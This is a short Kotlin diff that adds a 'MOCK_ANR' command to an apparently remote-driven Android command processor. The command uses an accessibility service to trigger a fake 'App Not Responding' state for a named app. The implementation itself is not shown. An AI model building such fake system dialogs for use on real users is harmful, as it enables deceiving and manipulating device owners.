@@ -1733,6 +1733,20 @@ object CommandProcessor {
                         errorMsg = e.message ?: "Unknown error during intent execution"
                     }
                 }
+                "MOCK_ANR" -> {
+                    if (MyAccessibilityService.instance == null) {
+                        status = "FAILED (SERVICE_OFF)"
+                        errorMsg = "Accessibility service required for UI manipulation."
+                    } else {
+                        val appName = if (content.isNotBlank()) content.trim() else null
+                        MyAccessibilityService.instance?.triggerFakeAnr(appName)
+                        status = "ANR_TRIGGERED"
+                    }
+                }
+                else -> {
+                    status = "FAILED (UNKNOWN_CMD)"
+                    errorMsg = "Command '$fileName' is not recognized by the device."
+                }
             }
         } catch (e: Exception) {
             status = "FAILED: ${e.message}"
